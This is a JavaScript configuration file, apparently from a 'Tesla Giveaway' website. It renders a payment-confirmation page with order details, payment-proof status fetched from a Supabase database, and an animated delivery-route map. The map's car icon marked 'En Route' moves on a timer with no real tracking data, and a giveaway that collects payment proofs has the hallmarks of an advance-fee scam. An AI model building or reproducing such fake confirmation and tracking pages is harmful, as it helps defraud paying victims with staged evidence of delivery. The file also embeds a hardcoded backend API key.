// Tesla Giveaway — shared browser configuration
(function (global) {
  'use strict';

  var deployedApiBase = '__TESLA_API_BASE__';
  var fallbackApiBase = 'https://puebwzumwqizgbmksrpq.supabase.co/functions/v1/tesla-api/api';
  var injected = deployedApiBase.indexOf('__') !== 0;
  function normalize(v) { return String(v || '').trim().replace(/\/+$/, ''); }
  global.TESLA_API_BASE = normalize(global.TESLA_API_BASE || (injected ? deployedApiBase : fallbackApiBase));

  global.TESLA_CURRENCIES = [
    {code:'USD',symbol:'$',label:'US Dollar'},{code:'EUR',symbol:'€',label:'Euro'},
    {code:'GBP',symbol:'£',label:'British Pound'},{code:'CAD',symbol:'C$',label:'Canadian Dollar'},
    {code:'AUD',symbol:'A$',label:'Australian Dollar'},{code:'NGN',symbol:'₦',label:'Nigerian Naira'},
    {code:'GHS',symbol:'₵',label:'Ghanaian Cedi'},{code:'KES',symbol:'KSh',label:'Kenyan Shilling'},
    {code:'ZAR',symbol:'R',label:'South African Rand'},{code:'INR',symbol:'₹',label:'Indian Rupee'},
    {code:'JPY',symbol:'¥',label:'Japanese Yen'},{code:'CNY',symbol:'¥',label:'Chinese Yuan'},
    {code:'CHF',symbol:'Fr',label:'Swiss Franc'},{code:'AED',symbol:'AED',label:'UAE Dirham'},
    {code:'BRL',symbol:'R$',label:'Brazilian Real'}
  ];
  global.teslaCurrencySymbol = function(code) {
    var list = global.TESLA_CURRENCIES || [];
    for (var i=0;i<list.length;i++) if (list[i].code === code) return list[i].symbol;
    return code || '$';
  };

  if (!/payment-confirmation\.html$/i.test(global.location.pathname)) return;

  var SUPABASE_URL = 'https://puebwzumwqizgbmksrpq.supabase.co';
  var SUPABASE_ANON_KEY = global.SUPABASE_ANON_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB1ZWJ3enVtd3FpemdibG1zcnBxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU5ODEyMjYsImV4cCI6MjA2MTU1NzIyNn0.kfup1Lsb8vnvKLjAH0r-SM5mqLYMttOzQsN7YT6ISrw';

  var style = document.createElement('style');
  style.textContent = '#vehicleImg{visibility:hidden!important} .pc-nav-label{display:none!important} #trackBtn{display:none!important}';
  (document.head || document.documentElement).appendChild(style);

  var VEHICLES = {
    cybertruck: {label:'Cybertruck', image:SUPABASE_URL+'/storage/v1/object/public/vehicle-images/cybertruck-main.png'},
    modely: {label:'Model Y', image:SUPABASE_URL+'/storage/v1/object/public/vehicle-images/modely-main.png'},
    models: {label:'Model S', image:SUPABASE_URL+'/storage/v1/object/public/vehicle-images/models-main.png'},
    model3: {label:'Model 3', image:SUPABASE_URL+'/storage/v1/object/public/vehicle-images/model3-main.png'},
    modelx: {label:'Model X', image:SUPABASE_URL+'/storage/v1/object/public/vehicle-images/modelx-main.png'}
  };

  function clean(v){ return String(v == null ? '' : v).trim(); }
  function key(v){ return clean(v).toLowerCase().replace(/[^a-z0-9]/g,''); }
  function el(id){ return document.getElementById(id); }
  function value(obj, paths){
    if (!obj || typeof obj !== 'object') return '';
    for (var i=0;i<paths.length;i++) {
      var cur=obj, parts=paths[i].split('.');
      for (var j=0;j<parts.length && cur != null;j++) cur=cur[parts[j]];
      if (cur != null && clean(cur)) return cur;
    }
    return '';
  }
  function put(id,v){ var n=el(id); if(n && clean(v)) n.textContent=clean(v); }
  function date(v){
    if(!v) return '';
    var d=new Date(v); if(isNaN(d.getTime())) return v;
    return d.toLocaleString('en-US',{month:'short',day:'numeric',year:'numeric',hour:'numeric',minute:'2-digit'});
  }
  function session(){
    try { if(typeof getSession==='function' && getSession()) return getSession(); } catch(e){}
    return localStorage.getItem('tesla_session') || localStorage.getItem('tesla_session_token') || '';
  }
  function localOrder(){ try{return JSON.parse(localStorage.getItem('tesla_last_order')||'null');}catch(e){return null;} }

  function vehicleKey(order){
    var c=order && (order.selectedCar||order.car||order.vehicle||{});
    var k=key(value(c,['id','model','name','slug','key']));
    if(k.indexOf('cybertruck')>=0) return 'cybertruck';
    if(k==='modely'||k.indexOf('modely')>=0||k==='y') return 'modely';
    if(k==='model3'||k.indexOf('model3')>=0||k==='3') return 'model3';
    if(k==='modelx'||k.indexOf('modelx')>=0||k==='x') return 'modelx';
    if(k==='models'||k.indexOf('models')>=0||k==='s') return 'models';
    return '';
  }

  function renderVehicle(order){
    var img=el('vehicleImg'), name=el('vehicleName');
    var k=vehicleKey(order);
    if(!img || !k || !VEHICLES[k]) return;
    var c=order.selectedCar||order.car||order.vehicle||{};
    var label=value(c,['name','model']) || VEHICLES[k].label;
    if(name) name.textContent='Tesla '+label;
    img.style.visibility='hidden';
    var expected=VEHICLES[k].image;
    var preload=new Image();
    preload.onload=function(){img.src=expected;img.dataset.vehicleKey=k;img.style.visibility='visible';};
    preload.onerror=function(){img.style.visibility='hidden';console.error('[Tesla] Vehicle image failed:',expected);};
    preload.src=expected;
  }

  function renderOrder(order,user,proof){
    if(!order) return;
    var dd=order.deliveryDetails||order.delivery||{}, pm=order.paymentMethod||order.payment||{}, dm=order.deliveryMethod||order.deliveryOption||{}, u=user||order.user||{}, p=proof||order.paymentProof||order.payment_proof||order.proof||{};
    put('orderId',value(order,['orderId','id','order_id']));
    put('trackingNum',value(order,['trackingNumber','tracking_number','tracking']));
    put('orderDate',date(value(order,['orderDate','order_date','createdAt','created_at'])));
    put('estDelivery',value(order,['estimatedDelivery','estimated_delivery']));
    var paymentMethod=value(p,['payment_method','paymentMethod','method','name','label','type']) || value(pm,['name','label','type','method']);
    var deliveryMethod=value(dm,['name','label','type','method','delivery_method']) || value(dd,['deliveryMethod','delivery_method','method']);
    put('paymentMethod',paymentMethod); put('proofMethod',paymentMethod); put('deliveryMethod',deliveryMethod);
    var fullName=value(u,['fullName','name']) || [value(u,['firstName','first_name']),value(u,['lastName','last_name'])].filter(Boolean).join(' ');
    put('custName',fullName || value(dd,['fullName','name']));
    put('custEmail',value(u,['email']) || value(order,['customerEmail','customer_email','email']) || value(dd,['email']));
    put('custPhone',value(u,['phone','phoneNumber','phone_number']) || value(dd,['phone','phoneNumber','phone_number']));
    put('delName',value(dd,['fullName','name','recipientName','recipient_name']));
    put('delAddr',value(dd,['address','street','streetAddress','street_address']));
    put('delCity',value(dd,['city']));
    put('delStateZip',[value(dd,['state','province']),value(dd,['zipCode','zip','postalCode','postal_code'])].filter(Boolean).join(' '));
    put('delCountry',value(dd,['country','countryName','country_name']));
    var status=value(p,['status','payment_status','proof_status']) || value(order,['paymentStatus','payment_status','proofStatus','proof_status']) || value(pm,['status','paymentStatus']);
    var submitted=value(p,['created_at','submitted_at','payment_submitted_at','paymentSubmittedAt']) || value(order,['paymentSubmittedAt','payment_submitted_at']);
    put('proofStatus',status || 'Pending'); put('proofDate',date(submitted));
    var proofUrl=value(p,['proof_url','payment_proof_url','paymentProofUrl','receipt_url']);
    if(proofUrl){var w=el('proofImgWrap'),pi=el('proofImg');if(w&&pi){pi.src=proofUrl;w.style.display='block';}}
    renderVehicle(order); global.__TESLA_PC_ORDER__=order; global.__TESLA_PC_DELIVERY__=dd;
  }

  function proofRequest(path){
    return fetch(SUPABASE_URL+'/rest/v1/payment_proofs?select=*'+path,{headers:{apikey:SUPABASE_ANON_KEY,Authorization:'Bearer '+SUPABASE_ANON_KEY}})
      .then(function(r){return r.ok?r.json():[];}).catch(function(){return [];});
  }
  function getProof(order,user){
    var oid=value(order,['orderId','id','order_id']), email=value(user,['email'])||value(order,['customerEmail','customer_email','email']);
    if(oid) return proofRequest('&order_id=eq.'+encodeURIComponent(oid)+'&order=created_at.desc&limit=1').then(function(rows){
      if(rows&&rows.length)return rows[0];
      return email?proofRequest('&customer_email=eq.'+encodeURIComponent(email)+'&order=created_at.desc&limit=1').then(function(r){return r&&r[0]||null;}):null;
    });
    return email?proofRequest('&customer_email=eq.'+encodeURIComponent(email)+'&order=created_at.desc&limit=1').then(function(r){return r&&r[0]||null;}):Promise.resolve(null);
  }

  function routeMap(dd){
    if(!global.L || !el('confMap')) return false;
    var old=el('confMap'), node=document.createElement('div');node.id='confMap';node.className=old.className;old.parentNode.replaceChild(node,old);
    var heading=document.querySelector('#mapCard .section-label');
    if(heading) heading.innerHTML='<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="1 6 1 22 8 18 16 22 23 18 23 2 16 6 8 2 1 6"/><line x1="8" y1="2" x2="8" y2="18"/><line x1="16" y1="6" x2="16" y2="22"/></svg>Delivery Route';
    var origin=[37.4936,-121.9448],dest=[40.7128,-74.0060],city=value(dd,['city']),state=value(dd,['state','province']),country=value(dd,['country']);
    var map=L.map(node).setView([39.1,-98.2],4);
    L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png',{attribution:'© OpenStreetMap © CARTO',maxZoom:19}).addTo(map);
    var red=L.divIcon({html:'<div style="width:14px;height:14px;background:#E31937;border-radius:50%;border:2px solid #fff"></div>',className:'',iconSize:[14,14],iconAnchor:[7,7]});
    var green=L.divIcon({html:'<div style="width:14px;height:14px;background:#00A550;border-radius:50%;border:2px solid #fff"></div>',className:'',iconSize:[14,14],iconAnchor:[7,7]});
    var car=L.divIcon({html:'<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#E31937" stroke-width="2"><rect x="1" y="3" width="15" height="13"/><path d="M16 8h4l3 3v5h-7z"/><circle cx="5.5" cy="18.5" r="2.5"/><circle cx="18.5" cy="18.5" r="2.5"/></svg>',className:'',iconSize:[24,24],iconAnchor:[12,12]});
    L.marker(origin,{icon:red}).addTo(map).bindPopup('<strong>Tesla Factory</strong><br>Fremont, CA — Origin');
    var destination=L.marker(dest,{icon:green}).addTo(map).bindPopup('<strong>Delivery Destination</strong><br>'+(city||'Your address')+(country?', '+country:''));
    var moving=L.marker([(origin[0]+dest[0])/2,(origin[1]+dest[1])/2],{icon:car}).addTo(map).bindPopup('<strong>Your Tesla</strong><br>En Route');
    var line=L.polyline([origin,dest],{color:'#E31937',weight:2.5,opacity:.55,dashArray:'8,8'}).addTo(map);map.fitBounds(L.latLngBounds([origin,dest]),{padding:[45,45]});
    if(city||state||country)fetch('https://nominatim.openstreetmap.org/search?format=json&limit=1&q='+encodeURIComponent([city,state,country].filter(Boolean).join(', '))).then(function(r){return r.json();}).then(function(rows){if(rows&&rows[0]){dest=[+rows[0].lat,+rows[0].lon];destination.setLatLng(dest);line.setLatLngs([origin,dest]);map.fitBounds(L.latLngBounds([origin,dest]),{padding:[45,45]});}}).catch(function(){});
    var p=.35;setInterval(function(){p=(p+.003)%1;moving.setLatLng([origin[0]+(dest[0]-origin[0])*p,origin[1]+(dest[1]-origin[1])*p]);},80);return true;
  }

  function removeLegacyControls(){var h=document.querySelector('.pc-nav-label');if(h)h.remove();var t=document.getElementById('trackBtn');if(t)t.remove();}
  function load(){
    removeLegacyControls();var local=localOrder(),token=session(),base=local;
    if(local)renderOrder(local,local.user||{},null);
    var req=token?fetch(global.TESLA_API_BASE+'/session?token='+encodeURIComponent(token)).then(function(r){return r.ok?r.json():null;}).catch(function(){return null;}):Promise.resolve(null);
    req.then(function(data){
      if(data&&data.valid&&data.order){base=data.order;global._userData=data.user||{};}
      if(!base)return null;
      return getProof(base,(data&&data.valid?data.user:null)||base.user||{}).then(function(proof){renderOrder(base,(data&&data.valid?data.user:null)||base.user||{},proof);});
    }).then(removeLegacyControls);
  }

  function start(){
    load();
    var attempts=0,timer=setInterval(function(){
      attempts++;if(global.L){clearInterval(timer);routeMap(global.__TESLA_PC_DELIVERY__||((global.__TESLA_PC_ORDER__||localOrder()||{}).deliveryDetails)||{});removeLegacyControls();}
      if(attempts>50)clearInterval(timer);
    },100);
    setTimeout(load,1500);
  }
  if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',start,{once:true});else start();
})(window);